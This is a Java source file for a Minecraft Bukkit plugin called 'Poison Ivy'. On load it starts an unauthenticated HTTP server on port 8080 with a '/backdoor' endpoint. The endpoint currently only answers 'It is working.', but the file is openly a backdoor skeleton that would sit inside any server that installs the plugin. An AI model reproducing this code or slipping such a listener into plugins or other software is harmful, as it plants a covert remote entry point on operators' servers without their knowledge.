
// Author: Dashie
// Version: 1.0


package com.dashivy;


import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import org.bukkit.ChatColor;
import org.bukkit.plugin.java.JavaPlugin;


public class PoisonIvy extends JavaPlugin
{   
    @Override
    public void onEnable()
    {
        print("Loading Poison Ivy ....");
        
        try
        {
            HttpServer http_server = HttpServer.create(new InetSocketAddress(8080), 0);
            
            http_server.createContext("/backdoor", new PoisonIvyListener());            
            http_server.setExecutor(null);
            http_server.start();
        }
        
        catch (Exception e) { print(e.getMessage()); };
        
        print("Poison Ivy is now running!");
    };
    
    
    class PoisonIvyListener implements HttpHandler
    {
        private String load_information()
        {
            return "It is working.";
        };
        
        
        @Override
        public void handle(HttpExchange html) throws IOException
        {
            String html_data = load_information();        
            html.sendResponseHeaders(200, html_data.length());
            
            OutputStream output_stream = html.getResponseBody();
            
            output_stream.write(html_data.getBytes());
            output_stream.close();
        };
    };
    
    
    @Override
    public void onDisable()
    {};
    
    
    public static String trans_str(String str)
    {
        return ChatColor.translateAlternateColorCodes('&', str);
    };

    public static void print(String str)
    {
        System.out.println("(DashIvy): " + str);
    };
};
